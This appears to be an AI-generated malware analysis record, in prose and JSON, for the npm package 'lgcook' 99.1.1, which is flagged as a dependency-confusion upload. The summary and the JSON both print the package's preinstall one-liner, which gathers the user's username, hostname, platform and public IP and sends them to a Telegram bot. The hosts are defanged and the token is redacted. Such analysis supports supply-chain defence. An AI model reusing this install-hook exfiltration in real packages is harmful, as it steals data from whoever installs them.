# npm lgcook@99.1.1

**Source:** datadog · **Source label:** malicious · **Released:** 2026-04-19 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package runs a `node -e` one-liner from its `preinstall` hook. It reads the username, hostname and platform, fetches the public IP from api[.]ipify[.]org, and sends all of it as a message to a Telegram bot through the Bot API. There are no gates. The payload runs on every install, and it only needs outbound HTTPS to both hosts.

## Execution

- **preinstall** `node -e "const h=require('https'),o=require('os'); const data={pkg:'lgcook',u:o.userInfo().username,h:o.hostname(),p:o.platform(),ip:''}; h.get('hxxps://api[.]ipify[.]org?format=json',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{data.ip=JSON.parse(d).ip; const msg=encodeURIComponent('🚨 *BEAST HIT: LGCOOK* 🚨\n'+JSON.stringify(data,null,2)); h.get('hxxps://api[.]telegram[.]org/bot8236…/sendMessage?chat_id=8655…&text='+msg)})})"`: no package files; inline_eval.

## Gates

None.

## Requirements

- network: api[.]ipify[.]org:443 (public IP lookup; its JSON reply must parse before the exfil request is sent)
- network: api[.]telegram[.]org:443 (Telegram Bot API sendMessage receives the collected host data)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The Telegram bot token and chat id are redacted. The ipify lookup is listed as a network requirement, not an endpoint, because no endpoint role fits a recon lookup.
- The script has no error handling. If the ipify reply does not parse, the script crashes before the exfil request is sent.
- The description "Internal Payment Utility" and version 99.1.1 point to dependency confusion. The `main` file index.js is not in the package.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "lgcook",
    "version": "99.1.1",
    "archive_sha256": "eb9b57aebf7c9c2b9dbf5cb6b9414637ed56d20a8c7fba28dafcb54498ae4ec9",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2026-04-19",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2026-04-19-lgcook-v99.1.1.zip",
    "package_root": "layer0/var/folders/rs/52vst_5924nc0zz5ccww9tl80000gp/T/tmpeyaiiy08/lgcook/package",
    "cluster_key": "7998169b233c9aea9a1c30e0d03fe2c7d45be79fd27fbac20039c1b2d2767a81",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "node -e \"const h=require('https'),o=require('os'); const data={pkg:'lgcook',u:o.userInfo().username,h:o.hostname(),p:o.platform(),ip:''}; h.get('hxxps://api[.]ipify[.]org?format=json',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{data.ip=JSON.parse(d).ip; const msg=encodeURIComponent('🚨 *BEAST HIT: LGCOOK* 🚨\\n'+JSON.stringify(data,null,2)); h.get('hxxps://api[.]telegram[.]org/bot8236…/sendMessage?chat_id=8655…&text='+msg)})})\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "node",
        "launch_style": [
          "inline_eval"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "The only install code is the inline preinstall script in package.json (derived d1), read in full. main names index.js, which is not shipped in the package.",
      "No environment checks: username, hostname and platform are only collected and sent. The ipify reply goes through JSON.parse with no error handlers, so a failed lookup crashes the script before the Telegram send.",
      "api.ipify.org is a public IP lookup used for recon; no endpoint role fits it, so it is listed under requirements only. Telegram bot token and chat id are redacted.",
      "Description 'Internal Payment Utility' with version 99.1.1 fits a dependency confusion upload."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "api[.]ipify[.]org:443",
      "reason": "public IP lookup; its JSON reply must parse before the exfil request is sent"
    },
    {
      "axis": "network",
      "value": "api[.]telegram[.]org:443",
      "reason": "Telegram Bot API sendMessage receives the collected host data"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://api[.]telegram[.]org/bot8236…/sendMessage?chat_id=8655…&text=",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally collects username, hostname, platform and public IP and sends them to a Telegram bot. There are no environment gates.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "inline_script",
        "recipe_version": 1,
        "input": {
          "file": "package.json",
          "derived_from": null
        },
        "params": {
          "hook": "preinstall",
          "flag": "-e"
        },
        "output_sha256": "81007cef928889d7"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
